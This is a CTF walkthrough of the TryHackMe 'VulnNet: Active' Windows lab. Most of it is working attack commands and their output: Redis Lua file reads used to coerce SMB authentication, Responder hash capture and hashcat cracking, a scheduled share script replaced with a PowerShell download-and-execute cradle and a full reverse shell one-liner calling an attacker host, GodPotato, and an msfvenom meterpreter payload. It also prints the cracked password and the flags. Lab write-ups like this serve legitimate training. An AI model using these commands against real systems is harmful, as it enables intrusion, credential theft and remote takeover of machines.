# VulnNet: Active

### 🌍 Translations

This README is also available in [Русский (Russian)](README.ru.md)

## Write-up

Initially the ip address was given to us, so the first thing to do is to scan the host to gather some information:
```bash
$ rustscan -a <target_ip> -- -sV --version-all --script=vuln -Pn -A
...
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
6379/tcp  open  redis         syn-ack ttl 126 Redis key-value store 2.8.2402
| vulners: 
|   cpe:/a:redislabs:redis:2.8.2402: 
|       CVE-2018-11219  9.8     https://vulners.com/cve/CVE-2018-11219
|       CVE-2018-11218  9.8     https://vulners.com/cve/CVE-2018-11218
|       EDB-ID:44904    8.4     https://vulners.com/exploitdb/EDB-ID:44904      *EXPLOIT*
|       CVE-2018-12326  8.4     https://vulners.com/cve/CVE-2018-12326
|       CVE-2020-14147  7.7     https://vulners.com/cve/CVE-2020-14147
|       EDB-ID:44908    7.5     https://vulners.com/exploitdb/EDB-ID:44908      *EXPLOIT*
|       CVE-2021-32761  7.5     https://vulners.com/cve/CVE-2021-32761
|       CVE-2018-12453  7.5     https://vulners.com/cve/CVE-2018-12453
|       CVE-2016-10517  7.4     https://vulners.com/cve/CVE-2016-10517
|       CVE-2021-3470   5.3     https://vulners.com/cve/CVE-2021-3470
|       EXPLOITPACK:67A9C59CE90430ACE23C1808DE8F7BD2    5.0     https://vulners.com/exploitpack/EXPLOITPACK:67A9C59CE90430ACE23C1808DE8F7BD2    *EXPLOIT*
|       EXPLOITPACK:9F45D8CAB6F6E66F98E43562AEAB5DE2    4.6     https://vulners.com/exploitpack/EXPLOITPACK:9F45D8CAB6F6E66F98E43562AEAB5DE2    *EXPLOIT*
|       CVE-2013-7458   3.3     https://vulners.com/cve/CVE-2013-7458
|       PACKETSTORM:148270      0.0     https://vulners.com/packetstorm/PACKETSTORM:148270      *EXPLOIT*
|       PACKETSTORM:148225      0.0     https://vulners.com/packetstorm/PACKETSTORM:148225      *EXPLOIT*
|       1337DAY-ID-30603        0.0     https://vulners.com/zdt/1337DAY-ID-30603        *EXPLOIT*
|_      1337DAY-ID-30598        0.0     https://vulners.com/zdt/1337DAY-ID-30598        *EXPLOIT*
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49690/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Windows Server 2019 (97%)
No exact OS matches for host (test conditions non-ideal).
```
Or you can use `nmap` tool for the same purpose:
```bash
$ sudo nmap -sS -p- -v -T4 -sC -O <target_ip>
```
We can take a note of important clues:
 - it's a *Microsoft Windows Server 2019*;
 - host has *smb open port 445*;
 - host has *redis service* running on default port.

The try of testing attempting anonymous access to the SMB share did not yield sufficient results: the presence of such user, but he cannot enumerate shares or get another information from smb.

The last thing to do is try an effort on redis. There were some ideas about the ways to get a shell:
 - find RCE (Remote Code Execution) exploit;
 - find built it functionality to get a shell;
 - find any credentials or something else there.

Reconnaissance in redis showed the version 2.8.2402:
```bash
$ redis-cli -h <target_ip>
redis <target_ip>:6379> CONFIG GET dir
1) "dir"
2) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
```
A number of RCE exploit on Redis were found, but they are useful for Redis 4-5 versions, version 2.8.2402 is too old for those exploits.

We can create some files with content, but there is no functionality to execute them. We can also load a file into the startup folder, but we cannot trigger the user to log out and back in.

A common technique in a domain environment with a SQL/NoSQL databases is the attempt to read a file from a network share (LLMNR/NBT-NS Poisoning attack). So, we can use this technique to catch an NTLMv2 password hash.

First, I found a command allows to read files:
```bash
<target_ip>:6379> EVAL 'dofile("C:\\test.txt")' 0
(error) ERR Error running script (call to f_f605751492f1c2a4007748b6dec33c156d36455f): @user_script:1: cannot open C:\test.txt: No such file or directory
```
The command works, this shows an attempt to access the file in a C drive. By the way, we can now read the user flag:
```bash
<target_ip>:6379> EVAL "return dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
(error) ERR Error running script (call to f_0d774ebaa144c4dca9635e3c74cb345ba11b9d52): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e' 
```
Just wrap it in `THM{}` tags and that's it.

The next step is to set the environment for poisoning requests and opening smb share on the attack machine:

```bash
sudo responder -I tun0
```
 We sniff the traffic and now are ready to get a NTLMv2 Response. So all we need is to open any file in our smb share folder:

```bash
<target_ip>:6379> EVAL 'dofile("\\<attacker_ip>\hello.txt")' 0
(error) ERR Error running script (call to f_2eae4c5fb68418795e7de5e3a00de3de32323f70): @user_script:1: cannot open \<attacker_ip>hello.txt: No such file or directory
```
The response showed that the command removed some `\` signs, so let's correct the command:
```bash
<target_ip>:6379> EVAL 'dofile("\\\\<attacker_ip>\\hello.txt")' 0
(error) ERR Error running script (call to f_1e2831f77e91ba982742fbfc1d9b377d5363e018): @user_script:1: cannot open \\<attacker_ip>\hello.txt: Permission denied
```
We did a valid request for a file hello.txt on the attack machine. The Responder caught the NTLMv2 hash:
```bash
[SMB] NTLMv2-SSP Client   : <target_ip>
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:a48ae7e6a56444ff:99ACD32F7970CD7AE6BB0892EF2E149F:0101000000000000007CEADF4B85DC016A0546F33DFC85B50000000002000800410041005800520001001E00570049004E002D0035004B004300440037004D004B00580050003600460004003400570049004E002D0035004B004300440037004D004B0058005000360046002E0041004100580052002E004C004F00430041004C000300140041004100580052002E004C004F00430041004C000500140041004100580052002E004C004F00430041004C0007000800007CEADF4B85DC0106000400020000000800300030000000000000000000000000300000C4386583A50FF890D4B6830E04574D8E88726CC866959B39E33D49A1816369F10A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100320038002E003100340031000000000000000000 
```
Now we save the `NTLMv2-SSP Hash` into a `pass.hash` file, identify the hashcat mode to crack the hash offline with `hashcat --identify pass.hash` and use the result command:
```bash
hashcat -a 0 -m 5600 pass.hash /usr/share/wordlists/rockyou.txt
...
ENTERPRISE-SECURITY::VULNNET:a48ae7e6a56444ff:99acd32f7970cd7ae6bb0892ef2e149f:0101000000000000007ceadf4b85dc016a0546f33dfc85b50000000002000800410041005800520001001e00570049004e002d0035004b004300440037004d004b00580050003600460004003400570049004e002d0035004b004300440037004d004b0058005000360046002e0041004100580052002e004c004f00430041004c000300140041004100580052002e004c004f00430041004c000500140041004100580052002e004c004f00430041004c0007000800007ceadf4b85dc0106000400020000000800300030000000000000000000000000300000c4386583a50ff890d4b6830e04574d8e88726cc866959b39e33d49a1816369f10a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100320038002e003100340031000000000000000000:sand_0873959498
...
```
Now we have cleartext credentials to continue dealing with smb protocol. First thing to do is enumerate non-default network shares available for reading, writing, etc. permitions:
```bash
$ nxc smb <target_ip> -u enterprise-security -p sand_0873959498 --shares
SMB         <target_ip>    445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
SMB         <target_ip>    445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:sand_0873959498
SMB         <target_ip>    445    VULNNET-BC3TCK1  [*] Enumerated shares
SMB         <target_ip>    445    VULNNET-BC3TCK1  Share           Permissions     Remark
SMB         <target_ip>    445    VULNNET-BC3TCK1  -----           -----------     ------
SMB         <target_ip>    445    VULNNET-BC3TCK1  ADMIN$                          Remote Admin
SMB         <target_ip>    445    VULNNET-BC3TCK1  C$                              Default share
SMB         <target_ip>    445    VULNNET-BC3TCK1  Enterprise-Share READ,WRITE
SMB         <target_ip>    445    VULNNET-BC3TCK1  IPC$            READ            Remote IPC
SMB         <target_ip>    445    VULNNET-BC3TCK1  NETLOGON        READ            Logon server share
SMB         <target_ip>    445    VULNNET-BC3TCK1  SYSVOL          READ            Logon server share
```
We got interesting folder named `Enterprise-Share`. It can potentialy contain sensitive data. To get into this folder we can utilise `smbclient //<target_ip>/Enterprise-Share -U 'VULNNET\enterprise-security'` command. There is just one powershell script file:
```bash
smb: \> ls
  .                                   D        0  Wed Jan 14 15:25:57 2026
  ..                                  D        0  Wed Jan 14 15:25:57 2026
  PurgeIrrelevantData_1826.ps1        A       45  Wed Jan 14 15:25:12 2026
```
Using `more` command we can read a file and get its content:
```bash
rm -Force C:\Users\Public\Documents* -ErrorAction SilentlyContinue
```
This file deletes all files in a specified directory. It might be on a schedule task execution, because there is no reason to remove files once, or running it manually instead of typing the command in a shell.

We have write permissions in this directory, so we can delete this file and add a new one with the same name, that gives us a shell. The `put` command  can substitude the file located in the network share with our local reverse shell file. For some reasons no one powershell reverse shell script executed successfully, so it was decided to test with a simple command `pwd > \\<target_ip>\Enterprise-Share\who.txt`. After a minute the script executed and a file `who.txt` appeared. It also contained valid information about the current user:
```bash
smb: \> put PurgeIrrelevantData_1826.ps1
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (0.2 kB/s) (average 2.0 kB/s)
smb: \> ls
  .                                   D        0  Wed Feb 24 01:45:41 2021
  ..                                  D        0  Wed Feb 24 01:45:41 2021
  PurgeIrrelevantData_1826.ps1        A       45  Wed Jan 14 15:25:12 2026

                9558271 blocks of size 4096. 5139997 blocks available
smb: \> ls
  .                                   D        0  Wed Jan 14 15:25:57 2026
  ..                                  D        0  Wed Jan 14 15:25:57 2026
  PurgeIrrelevantData_1826.ps1        A       45  Wed Jan 14 15:25:12 2026
  who.txt                             A      254  Wed Jan 14 15:26:15 2026
```
As 3 different powershell script for reverse shell establishment were used, the reason of failuers could be the size of that script files. As we cannot execute my reverse shells there, we can write a script that connects to our machine, downloads a file content and execute in memory. We need also open http server on the attacker (our) host and create a reverse shell file `shell.ps1`, that will be executed:
```bash
$ cat PurgeIrrelevantData_1826.ps1
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://<attacker_ip>:<server_port_for_shell_load>/shell.ps1')"

$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
<target_ip> - - [14/Jan/2026 15:30:05] "GET /shell.ps1 HTTP/1.1" 200 -
```
The `shell.ps1` script contains the base64 decoded payload, that gives us a reverse shell on port `4444`. We can get that payload this way:
```bash
$ wget https://gist.githubusercontent.com/tothi/ab288fb523a4b32b51a53e542d40fe58/raw/40ade3fb5e3665b82310c08d36597123c2e75ab4/mkpsrevshell.py
...
$ python3 mkpsrevshell.py <attacker_ip> 4444
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8...
```
To catch the reverse shell we need to open this port for listening:
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [<attacker_ip>] from (UNKNOWN) [<target_ip>] 49752

PS C:\Users\enterprise-security\Downloads>
```
As we can see, we got a user shell by putting a file to a share and waiting for a minute.

Another, more simple mean to get a reverse shell, is to use this script:
```powershell
$client = New-Object System.Net.Sockets.TcpClient('<attacker_ip>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
If we will use this content in a `PurgeIrrelevantData_1826.ps1` file, it will be successfully executed. 

On the host we do some reconnaissance to get some information about a system we are in like `systeminfo` and `whoami /priv`. And we get an information, that it is a `64-bit system` and we have enabled `SeImpersonatePrivilege`, that can be abused wih Potato-like tools. Some Potatoes tools don't work, some do. One of the last is `GodPotato`.

To use this tool, we need, firstly, download `GodPotato-NET4.exe` file from `BeichenDream/GodPotato` repository. Secondly, download from the target host `wget http://<attacker_ip>:<server_port_for_exploit_load>/GodPotato-NET4.exe -OutFile C:\Windows\Temp\gp.exe` and, eventually, execute the binary with `C:\Windows\Temp\gp.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\system.txt"`. This mean bore fruit and we got `THM{d540c0645975900e5bb9167aa431fc9b}` flag.

Another more complicated mean is to get a system shell via `Metasploit framework`. To do this, we need to create a payload reverse shell `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<attacker_ip> lport=8443 -f exe -o reverse_shell.exe`, download the file from the target host `wget http://<attacker_ip>:<server_port_for_reverse_shell_load>/reverse_shell.exe -OutFile C:\Windows\Temp\reverse_shell.exe`. Now we need to setup a `Metasploit` to be waiting for a `metasploit shell`:
```bash
msf > use exploit/multi/handler
...
msf exploit(multi/handler) > show options
msf exploit(multi/handler) > set lhost <attacker_ip>
lhost => <attacker_ip>
msf exploit(multi/handler) > set lport <attacker_port>
lport => <attacker_port>
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > run
```
After a running `C:\Windows\Temp\reverse_shell.exe` file we got a user shell in `Metasploit`:
```bash
[*] Meterpreter session 17 opened (<attacker_ip>:<attacker_port> -> <target_ip>:49927) at 2026-01-14 17:05:31 +0300
```
And it was too easy to get a further `SYSTEM`:
```bash
meterpreter > getuid
Server username: VULNNET\enterprise-security
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > cat C:\\Users\\Administrator\\Desktop\\system.txt
THM{d540c0645975900e5bb9167aa431fc9b}
meterpreter > cat C:\\Users\\enterprise-security\\Desktop\\user.txt
THM{3eb176aee96432d5b100bc93580b291e}
```

